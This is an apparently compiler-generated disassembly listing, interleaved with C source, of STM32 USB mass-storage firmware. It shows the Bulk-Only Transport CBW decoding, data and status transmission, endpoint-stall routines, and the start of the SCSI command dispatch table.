 800977a:	68fb      	ldr	r3, [r7, #12]
 800977c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009780:	691b      	ldr	r3, [r3, #16]
  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 8009782:	4a38      	ldr	r2, [pc, #224]	; (8009864 <MSC_BOT_CBW_Decode+0x13c>)
 8009784:	4293      	cmp	r3, r2
 8009786:	d111      	bne.n	80097ac <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009788:	68fb      	ldr	r3, [r7, #12]
 800978a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800978e:	7f5b      	ldrb	r3, [r3, #29]
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 8009790:	2b01      	cmp	r3, #1
 8009792:	d80b      	bhi.n	80097ac <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009794:	68fb      	ldr	r3, [r7, #12]
 8009796:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800979a:	7f9b      	ldrb	r3, [r3, #30]
 800979c:	2b00      	cmp	r3, #0
 800979e:	d005      	beq.n	80097ac <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bCBLength > 16U))
 80097a0:	68fb      	ldr	r3, [r7, #12]
 80097a2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80097a6:	7f9b      	ldrb	r3, [r3, #30]
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80097a8:	2b10      	cmp	r3, #16
 80097aa:	d90f      	bls.n	80097cc <MSC_BOT_CBW_Decode+0xa4>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 80097ac:	68fb      	ldr	r3, [r7, #12]
 80097ae:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80097b2:	7f59      	ldrb	r1, [r3, #29]
 80097b4:	2320      	movs	r3, #32
 80097b6:	2205      	movs	r2, #5
 80097b8:	6878      	ldr	r0, [r7, #4]
 80097ba:	f000 fe7b 	bl	800a4b4 <SCSI_SenseCode>

    hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 80097be:	68fb      	ldr	r3, [r7, #12]
 80097c0:	2202      	movs	r2, #2
 80097c2:	725a      	strb	r2, [r3, #9]
    MSC_BOT_Abort(pdev);
 80097c4:	6878      	ldr	r0, [r7, #4]
 80097c6:	f000 f8cb 	bl	8009960 <MSC_BOT_Abort>
 80097ca:	e045      	b.n	8009858 <MSC_BOT_CBW_Decode+0x130>
  }
  else
  {
    if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 80097cc:	68fb      	ldr	r3, [r7, #12]
 80097ce:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80097d2:	7f59      	ldrb	r1, [r3, #29]
 80097d4:	68fb      	ldr	r3, [r7, #12]
 80097d6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80097da:	331f      	adds	r3, #31
 80097dc:	461a      	mov	r2, r3
 80097de:	6878      	ldr	r0, [r7, #4]
 80097e0:	f000 f93c 	bl	8009a5c <SCSI_ProcessCmd>
 80097e4:	4603      	mov	r3, r0
 80097e6:	2b00      	cmp	r3, #0
 80097e8:	da0c      	bge.n	8009804 <MSC_BOT_CBW_Decode+0xdc>
    {
      if (hmsc->bot_state == USBD_BOT_NO_DATA)
 80097ea:	68fb      	ldr	r3, [r7, #12]
 80097ec:	7a1b      	ldrb	r3, [r3, #8]
 80097ee:	2b05      	cmp	r3, #5
 80097f0:	d104      	bne.n	80097fc <MSC_BOT_CBW_Decode+0xd4>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80097f2:	2101      	movs	r1, #1
 80097f4:	6878      	ldr	r0, [r7, #4]
 80097f6:	f000 f873 	bl	80098e0 <MSC_BOT_SendCSW>
 80097fa:	e02d      	b.n	8009858 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 80097fc:	6878      	ldr	r0, [r7, #4]
 80097fe:	f000 f8af 	bl	8009960 <MSC_BOT_Abort>
 8009802:	e029      	b.n	8009858 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    /* Burst xfer handled internally */
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 8009804:	68fb      	ldr	r3, [r7, #12]
 8009806:	7a1b      	ldrb	r3, [r3, #8]
 8009808:	2b02      	cmp	r3, #2
 800980a:	d024      	beq.n	8009856 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 800980c:	68fb      	ldr	r3, [r7, #12]
 800980e:	7a1b      	ldrb	r3, [r3, #8]
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 8009810:	2b01      	cmp	r3, #1
 8009812:	d020      	beq.n	8009856 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_LAST_DATA_IN))
 8009814:	68fb      	ldr	r3, [r7, #12]
 8009816:	7a1b      	ldrb	r3, [r3, #8]
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 8009818:	2b03      	cmp	r3, #3
 800981a:	d01c      	beq.n	8009856 <MSC_BOT_CBW_Decode+0x12e>
    {
      if (hmsc->bot_data_length > 0U)
 800981c:	68fb      	ldr	r3, [r7, #12]
 800981e:	68db      	ldr	r3, [r3, #12]
 8009820:	2b00      	cmp	r3, #0
 8009822:	d009      	beq.n	8009838 <MSC_BOT_CBW_Decode+0x110>
      {
        MSC_BOT_SendData(pdev, hmsc->bot_data, hmsc->bot_data_length);
 8009824:	68fb      	ldr	r3, [r7, #12]
 8009826:	f103 0110 	add.w	r1, r3, #16
 800982a:	68fb      	ldr	r3, [r7, #12]
 800982c:	68db      	ldr	r3, [r3, #12]
 800982e:	461a      	mov	r2, r3
 8009830:	6878      	ldr	r0, [r7, #4]
 8009832:	f000 f819 	bl	8009868 <MSC_BOT_SendData>
      if (hmsc->bot_data_length > 0U)
 8009836:	e00f      	b.n	8009858 <MSC_BOT_CBW_Decode+0x130>
      }
      else if (hmsc->bot_data_length == 0U)
 8009838:	68fb      	ldr	r3, [r7, #12]
 800983a:	68db      	ldr	r3, [r3, #12]
 800983c:	2b00      	cmp	r3, #0
 800983e:	d104      	bne.n	800984a <MSC_BOT_CBW_Decode+0x122>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 8009840:	2100      	movs	r1, #0
 8009842:	6878      	ldr	r0, [r7, #4]
 8009844:	f000 f84c 	bl	80098e0 <MSC_BOT_SendCSW>
      if (hmsc->bot_data_length > 0U)
 8009848:	e006      	b.n	8009858 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 800984a:	6878      	ldr	r0, [r7, #4]
 800984c:	f000 f888 	bl	8009960 <MSC_BOT_Abort>
      if (hmsc->bot_data_length > 0U)
 8009850:	e002      	b.n	8009858 <MSC_BOT_CBW_Decode+0x130>
    return;
 8009852:	bf00      	nop
 8009854:	e000      	b.n	8009858 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    else
    {
      return;
 8009856:	bf00      	nop
    }
  }
}
 8009858:	3710      	adds	r7, #16
 800985a:	46bd      	mov	sp, r7
 800985c:	bd80      	pop	{r7, pc}
 800985e:	bf00      	nop
 8009860:	2000010b 	.word	0x2000010b
 8009864:	43425355 	.word	0x43425355

08009868 <MSC_BOT_SendData>:
  * @param  buf: pointer to data buffer
  * @param  len: Data Length
  * @retval None
  */
static void  MSC_BOT_SendData(USBD_HandleTypeDef *pdev, uint8_t *pbuf, uint32_t len)
{
 8009868:	b580      	push	{r7, lr}
 800986a:	b086      	sub	sp, #24
 800986c:	af00      	add	r7, sp, #0
 800986e:	60f8      	str	r0, [r7, #12]
 8009870:	60b9      	str	r1, [r7, #8]
 8009872:	607a      	str	r2, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009874:	68fb      	ldr	r3, [r7, #12]
 8009876:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800987a:	68fb      	ldr	r3, [r7, #12]
 800987c:	32b0      	adds	r2, #176	; 0xb0
 800987e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009882:	617b      	str	r3, [r7, #20]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009884:	697b      	ldr	r3, [r7, #20]
 8009886:	2b00      	cmp	r3, #0
 8009888:	d023      	beq.n	80098d2 <MSC_BOT_SendData+0x6a>
  {
    return;
  }

  length = MIN(hmsc->cbw.dDataLength, len);
 800988a:	697b      	ldr	r3, [r7, #20]
 800988c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009890:	699b      	ldr	r3, [r3, #24]
 8009892:	687a      	ldr	r2, [r7, #4]
 8009894:	4293      	cmp	r3, r2
 8009896:	bf28      	it	cs
 8009898:	4613      	movcs	r3, r2
 800989a:	613b      	str	r3, [r7, #16]

  hmsc->csw.dDataResidue -= len;
 800989c:	697b      	ldr	r3, [r7, #20]
 800989e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80098a2:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 80098a4:	687b      	ldr	r3, [r7, #4]
 80098a6:	1ad3      	subs	r3, r2, r3
 80098a8:	697a      	ldr	r2, [r7, #20]
 80098aa:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80098ae:	6393      	str	r3, [r2, #56]	; 0x38
  hmsc->csw.bStatus = USBD_CSW_CMD_PASSED;
 80098b0:	697b      	ldr	r3, [r7, #20]
 80098b2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80098b6:	2200      	movs	r2, #0
 80098b8:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_SEND_DATA;
 80098bc:	697b      	ldr	r3, [r7, #20]
 80098be:	2204      	movs	r2, #4
 80098c0:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, pbuf, length);
 80098c2:	4b06      	ldr	r3, [pc, #24]	; (80098dc <MSC_BOT_SendData+0x74>)
 80098c4:	7819      	ldrb	r1, [r3, #0]
 80098c6:	693b      	ldr	r3, [r7, #16]
 80098c8:	68ba      	ldr	r2, [r7, #8]
 80098ca:	68f8      	ldr	r0, [r7, #12]
 80098cc:	f003 fbe4 	bl	800d098 <USBD_LL_Transmit>
 80098d0:	e000      	b.n	80098d4 <MSC_BOT_SendData+0x6c>
    return;
 80098d2:	bf00      	nop
}
 80098d4:	3718      	adds	r7, #24
 80098d6:	46bd      	mov	sp, r7
 80098d8:	bd80      	pop	{r7, pc}
 80098da:	bf00      	nop
 80098dc:	2000010a 	.word	0x2000010a

080098e0 <MSC_BOT_SendCSW>:
  * @param  pdev: device instance
  * @param  status : CSW status
  * @retval None
  */
void  MSC_BOT_SendCSW(USBD_HandleTypeDef *pdev, uint8_t CSW_Status)
{
 80098e0:	b580      	push	{r7, lr}
 80098e2:	b084      	sub	sp, #16
 80098e4:	af00      	add	r7, sp, #0
 80098e6:	6078      	str	r0, [r7, #4]
 80098e8:	460b      	mov	r3, r1
 80098ea:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80098ec:	687b      	ldr	r3, [r7, #4]
 80098ee:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80098f2:	687b      	ldr	r3, [r7, #4]
 80098f4:	32b0      	adds	r2, #176	; 0xb0
 80098f6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80098fa:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80098fc:	68fb      	ldr	r3, [r7, #12]
 80098fe:	2b00      	cmp	r3, #0
 8009900:	d024      	beq.n	800994c <MSC_BOT_SendCSW+0x6c>
  {
    return;
  }

  hmsc->csw.dSignature = USBD_BOT_CSW_SIGNATURE;
 8009902:	68fb      	ldr	r3, [r7, #12]
 8009904:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009908:	461a      	mov	r2, r3
 800990a:	4b12      	ldr	r3, [pc, #72]	; (8009954 <MSC_BOT_SendCSW+0x74>)
 800990c:	6313      	str	r3, [r2, #48]	; 0x30
  hmsc->csw.bStatus = CSW_Status;
 800990e:	68fb      	ldr	r3, [r7, #12]
 8009910:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009914:	461a      	mov	r2, r3
 8009916:	78fb      	ldrb	r3, [r7, #3]
 8009918:	f882 303c 	strb.w	r3, [r2, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_IDLE;
 800991c:	68fb      	ldr	r3, [r7, #12]
 800991e:	2200      	movs	r2, #0
 8009920:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, (uint8_t *)&hmsc->csw,
 8009922:	4b0d      	ldr	r3, [pc, #52]	; (8009958 <MSC_BOT_SendCSW+0x78>)
 8009924:	7819      	ldrb	r1, [r3, #0]
 8009926:	68fb      	ldr	r3, [r7, #12]
 8009928:	f503 5281 	add.w	r2, r3, #4128	; 0x1020
 800992c:	3210      	adds	r2, #16
 800992e:	230d      	movs	r3, #13
 8009930:	6878      	ldr	r0, [r7, #4]
 8009932:	f003 fbb1 	bl	800d098 <USBD_LL_Transmit>
                         USBD_BOT_CSW_LENGTH);

  /* Prepare EP to Receive next Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 8009936:	4b09      	ldr	r3, [pc, #36]	; (800995c <MSC_BOT_SendCSW+0x7c>)
 8009938:	7819      	ldrb	r1, [r3, #0]
 800993a:	68fb      	ldr	r3, [r7, #12]
 800993c:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 8009940:	3210      	adds	r2, #16
 8009942:	231f      	movs	r3, #31
 8009944:	6878      	ldr	r0, [r7, #4]
 8009946:	f003 fbdf 	bl	800d108 <USBD_LL_PrepareReceive>
 800994a:	e000      	b.n	800994e <MSC_BOT_SendCSW+0x6e>
    return;
 800994c:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 800994e:	3710      	adds	r7, #16
 8009950:	46bd      	mov	sp, r7
 8009952:	bd80      	pop	{r7, pc}
 8009954:	53425355 	.word	0x53425355
 8009958:	2000010a 	.word	0x2000010a
 800995c:	2000010b 	.word	0x2000010b

08009960 <MSC_BOT_Abort>:
  * @param  pdev: device instance
  * @retval status
  */

static void  MSC_BOT_Abort(USBD_HandleTypeDef *pdev)
{
 8009960:	b580      	push	{r7, lr}
 8009962:	b084      	sub	sp, #16
 8009964:	af00      	add	r7, sp, #0
 8009966:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009968:	687b      	ldr	r3, [r7, #4]
 800996a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800996e:	687b      	ldr	r3, [r7, #4]
 8009970:	32b0      	adds	r2, #176	; 0xb0
 8009972:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009976:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009978:	68fb      	ldr	r3, [r7, #12]
 800997a:	2b00      	cmp	r3, #0
 800997c:	d02c      	beq.n	80099d8 <MSC_BOT_Abort+0x78>
  {
    return;
  }

  if ((hmsc->cbw.bmFlags == 0U) &&
 800997e:	68fb      	ldr	r3, [r7, #12]
 8009980:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009984:	7f1b      	ldrb	r3, [r3, #28]
 8009986:	2b00      	cmp	r3, #0
 8009988:	d10f      	bne.n	80099aa <MSC_BOT_Abort+0x4a>
      (hmsc->cbw.dDataLength != 0U) &&
 800998a:	68fb      	ldr	r3, [r7, #12]
 800998c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009990:	699b      	ldr	r3, [r3, #24]
  if ((hmsc->cbw.bmFlags == 0U) &&
 8009992:	2b00      	cmp	r3, #0
 8009994:	d009      	beq.n	80099aa <MSC_BOT_Abort+0x4a>
      (hmsc->bot_status == USBD_BOT_STATUS_NORMAL))
 8009996:	68fb      	ldr	r3, [r7, #12]
 8009998:	7a5b      	ldrb	r3, [r3, #9]
      (hmsc->cbw.dDataLength != 0U) &&
 800999a:	2b00      	cmp	r3, #0
 800999c:	d105      	bne.n	80099aa <MSC_BOT_Abort+0x4a>
  {
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800999e:	4b10      	ldr	r3, [pc, #64]	; (80099e0 <MSC_BOT_Abort+0x80>)
 80099a0:	781b      	ldrb	r3, [r3, #0]
 80099a2:	4619      	mov	r1, r3
 80099a4:	6878      	ldr	r0, [r7, #4]
 80099a6:	f003 faa7 	bl	800cef8 <USBD_LL_StallEP>
  }

  (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 80099aa:	4b0e      	ldr	r3, [pc, #56]	; (80099e4 <MSC_BOT_Abort+0x84>)
 80099ac:	781b      	ldrb	r3, [r3, #0]
 80099ae:	4619      	mov	r1, r3
 80099b0:	6878      	ldr	r0, [r7, #4]
 80099b2:	f003 faa1 	bl	800cef8 <USBD_LL_StallEP>

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR)
 80099b6:	68fb      	ldr	r3, [r7, #12]
 80099b8:	7a5b      	ldrb	r3, [r3, #9]
 80099ba:	2b02      	cmp	r3, #2
 80099bc:	d10d      	bne.n	80099da <MSC_BOT_Abort+0x7a>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 80099be:	4b09      	ldr	r3, [pc, #36]	; (80099e4 <MSC_BOT_Abort+0x84>)
 80099c0:	781b      	ldrb	r3, [r3, #0]
 80099c2:	4619      	mov	r1, r3
 80099c4:	6878      	ldr	r0, [r7, #4]
 80099c6:	f003 fa97 	bl	800cef8 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 80099ca:	4b05      	ldr	r3, [pc, #20]	; (80099e0 <MSC_BOT_Abort+0x80>)
 80099cc:	781b      	ldrb	r3, [r3, #0]
 80099ce:	4619      	mov	r1, r3
 80099d0:	6878      	ldr	r0, [r7, #4]
 80099d2:	f003 fa91 	bl	800cef8 <USBD_LL_StallEP>
 80099d6:	e000      	b.n	80099da <MSC_BOT_Abort+0x7a>
    return;
 80099d8:	bf00      	nop
  }
}
 80099da:	3710      	adds	r7, #16
 80099dc:	46bd      	mov	sp, r7
 80099de:	bd80      	pop	{r7, pc}
 80099e0:	2000010b 	.word	0x2000010b
 80099e4:	2000010a 	.word	0x2000010a

080099e8 <MSC_BOT_CplClrFeature>:
  * @param  epnum: endpoint index
  * @retval None
  */

void  MSC_BOT_CplClrFeature(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80099e8:	b580      	push	{r7, lr}
 80099ea:	b084      	sub	sp, #16
 80099ec:	af00      	add	r7, sp, #0
 80099ee:	6078      	str	r0, [r7, #4]
 80099f0:	460b      	mov	r3, r1
 80099f2:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80099f4:	687b      	ldr	r3, [r7, #4]
 80099f6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80099fa:	687b      	ldr	r3, [r7, #4]
 80099fc:	32b0      	adds	r2, #176	; 0xb0
 80099fe:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009a02:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009a04:	68fb      	ldr	r3, [r7, #12]
 8009a06:	2b00      	cmp	r3, #0
 8009a08:	d01d      	beq.n	8009a46 <MSC_BOT_CplClrFeature+0x5e>
  {
    return;
  }

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR) /* Bad CBW Signature */
 8009a0a:	68fb      	ldr	r3, [r7, #12]
 8009a0c:	7a5b      	ldrb	r3, [r3, #9]
 8009a0e:	2b02      	cmp	r3, #2
 8009a10:	d10c      	bne.n	8009a2c <MSC_BOT_CplClrFeature+0x44>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 8009a12:	4b10      	ldr	r3, [pc, #64]	; (8009a54 <MSC_BOT_CplClrFeature+0x6c>)
 8009a14:	781b      	ldrb	r3, [r3, #0]
 8009a16:	4619      	mov	r1, r3
 8009a18:	6878      	ldr	r0, [r7, #4]
 8009a1a:	f003 fa6d 	bl	800cef8 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 8009a1e:	4b0e      	ldr	r3, [pc, #56]	; (8009a58 <MSC_BOT_CplClrFeature+0x70>)
 8009a20:	781b      	ldrb	r3, [r3, #0]
 8009a22:	4619      	mov	r1, r3
 8009a24:	6878      	ldr	r0, [r7, #4]
 8009a26:	f003 fa67 	bl	800cef8 <USBD_LL_StallEP>
 8009a2a:	e00f      	b.n	8009a4c <MSC_BOT_CplClrFeature+0x64>
  }
  else if (((epnum & 0x80U) == 0x80U) && (hmsc->bot_status != USBD_BOT_STATUS_RECOVERY))
 8009a2c:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8009a30:	2b00      	cmp	r3, #0
 8009a32:	da0a      	bge.n	8009a4a <MSC_BOT_CplClrFeature+0x62>
 8009a34:	68fb      	ldr	r3, [r7, #12]
 8009a36:	7a5b      	ldrb	r3, [r3, #9]
 8009a38:	2b01      	cmp	r3, #1
 8009a3a:	d006      	beq.n	8009a4a <MSC_BOT_CplClrFeature+0x62>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009a3c:	2101      	movs	r1, #1
 8009a3e:	6878      	ldr	r0, [r7, #4]
 8009a40:	f7ff ff4e 	bl	80098e0 <MSC_BOT_SendCSW>
 8009a44:	e002      	b.n	8009a4c <MSC_BOT_CplClrFeature+0x64>
    return;
 8009a46:	bf00      	nop
 8009a48:	e000      	b.n	8009a4c <MSC_BOT_CplClrFeature+0x64>
  }
  else
  {
    return;
 8009a4a:	bf00      	nop
  }
}
 8009a4c:	3710      	adds	r7, #16
 8009a4e:	46bd      	mov	sp, r7
 8009a50:	bd80      	pop	{r7, pc}
 8009a52:	bf00      	nop
 8009a54:	2000010a 	.word	0x2000010a
 8009a58:	2000010b 	.word	0x2000010b

08009a5c <SCSI_ProcessCmd>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
int8_t SCSI_ProcessCmd(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *cmd)
{
 8009a5c:	b580      	push	{r7, lr}
 8009a5e:	b086      	sub	sp, #24
 8009a60:	af00      	add	r7, sp, #0
 8009a62:	60f8      	str	r0, [r7, #12]
 8009a64:	460b      	mov	r3, r1
 8009a66:	607a      	str	r2, [r7, #4]
 8009a68:	72fb      	strb	r3, [r7, #11]
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009a6a:	68fb      	ldr	r3, [r7, #12]
 8009a6c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009a70:	68fb      	ldr	r3, [r7, #12]
 8009a72:	32b0      	adds	r2, #176	; 0xb0
 8009a74:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009a78:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 8009a7a:	693b      	ldr	r3, [r7, #16]
 8009a7c:	2b00      	cmp	r3, #0
 8009a7e:	d102      	bne.n	8009a86 <SCSI_ProcessCmd+0x2a>
  {
    return -1;
 8009a80:	f04f 33ff 	mov.w	r3, #4294967295
 8009a84:	e168      	b.n	8009d58 <SCSI_ProcessCmd+0x2fc>
  }

  switch (cmd[0])
 8009a86:	687b      	ldr	r3, [r7, #4]
 8009a88:	781b      	ldrb	r3, [r3, #0]
 8009a8a:	2baa      	cmp	r3, #170	; 0xaa
 8009a8c:	f000 8144 	beq.w	8009d18 <SCSI_ProcessCmd+0x2bc>
 8009a90:	2baa      	cmp	r3, #170	; 0xaa
 8009a92:	f300 8153 	bgt.w	8009d3c <SCSI_ProcessCmd+0x2e0>
 8009a96:	2ba8      	cmp	r3, #168	; 0xa8
 8009a98:	f000 812c 	beq.w	8009cf4 <SCSI_ProcessCmd+0x298>
 8009a9c:	2ba8      	cmp	r3, #168	; 0xa8
 8009a9e:	f300 814d 	bgt.w	8009d3c <SCSI_ProcessCmd+0x2e0>
 8009aa2:	2b5a      	cmp	r3, #90	; 0x5a
 8009aa4:	f300 80c0 	bgt.w	8009c28 <SCSI_ProcessCmd+0x1cc>
 8009aa8:	2b00      	cmp	r3, #0
 8009aaa:	f2c0 8147 	blt.w	8009d3c <SCSI_ProcessCmd+0x2e0>
 8009aae:	2b5a      	cmp	r3, #90	; 0x5a
 8009ab0:	f200 8144 	bhi.w	8009d3c <SCSI_ProcessCmd+0x2e0>
 8009ab4:	a201      	add	r2, pc, #4	; (adr r2, 8009abc <SCSI_ProcessCmd+0x60>)
 8009ab6:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8009aba:	bf00      	nop
 8009abc:	08009c2f 	.word	0x08009c2f
 8009ac0:	08009d3d 	.word	0x08009d3d
 8009ac4:	08009d3d 	.word	0x08009d3d
 8009ac8:	08009c41 	.word	0x08009c41
 8009acc:	08009d3d 	.word	0x08009d3d
 8009ad0:	08009d3d 	.word	0x08009d3d
 8009ad4:	08009d3d 	.word	0x08009d3d
 8009ad8:	08009d3d 	.word	0x08009d3d
 8009adc:	08009d3d 	.word	0x08009d3d
 8009ae0:	08009d3d 	.word	0x08009d3d
 8009ae4:	08009d3d 	.word	0x08009d3d
 8009ae8:	08009d3d 	.word	0x08009d3d
 8009aec:	08009d3d 	.word	0x08009d3d
 8009af0:	08009d3d 	.word	0x08009d3d
 8009af4:	08009d3d 	.word	0x08009d3d
 8009af8:	08009d3d 	.word	0x08009d3d
 8009afc:	08009d3d 	.word	0x08009d3d
 8009b00:	08009d3d 	.word	0x08009d3d
 8009b04:	08009c53 	.word	0x08009c53
 8009b08:	08009d3d 	.word	0x08009d3d
 8009b0c:	08009d3d 	.word	0x08009d3d
 8009b10:	08009d3d 	.word	0x08009d3d
 8009b14:	08009d3d 	.word	0x08009d3d
 8009b18:	08009d3d 	.word	0x08009d3d
 8009b1c:	08009d3d 	.word	0x08009d3d
 8009b20:	08009d3d 	.word	0x08009d3d
 8009b24:	08009c89 	.word	0x08009c89
 8009b28:	08009c65 	.word	0x08009c65
 8009b2c:	08009d3d 	.word	0x08009d3d
 8009b30:	08009d3d 	.word	0x08009d3d
 8009b34:	08009c77 	.word	0x08009c77
 8009b38:	08009d3d 	.word	0x08009d3d
 8009b3c:	08009d3d 	.word	0x08009d3d
 8009b40:	08009d3d 	.word	0x08009d3d
 8009b44:	08009d3d 	.word	0x08009d3d
 8009b48:	08009cad 	.word	0x08009cad
 8009b4c:	08009d3d 	.word	0x08009d3d
 8009b50:	08009cbf 	.word	0x08009cbf
 8009b54:	08009d3d 	.word	0x08009d3d
 8009b58:	08009d3d 	.word	0x08009d3d
 8009b5c:	08009ce3 	.word	0x08009ce3
 8009b60:	08009d3d 	.word	0x08009d3d
 8009b64:	08009d07 	.word	0x08009d07
 8009b68:	08009d3d 	.word	0x08009d3d
 8009b6c:	08009d3d 	.word	0x08009d3d
 8009b70:	08009d3d 	.word	0x08009d3d
 8009b74:	08009d3d 	.word	0x08009d3d
 8009b78:	08009d2b 	.word	0x08009d2b
 8009b7c:	08009d3d 	.word	0x08009d3d
 8009b80:	08009d3d 	.word	0x08009d3d
 8009b84:	08009d3d 	.word	0x08009d3d
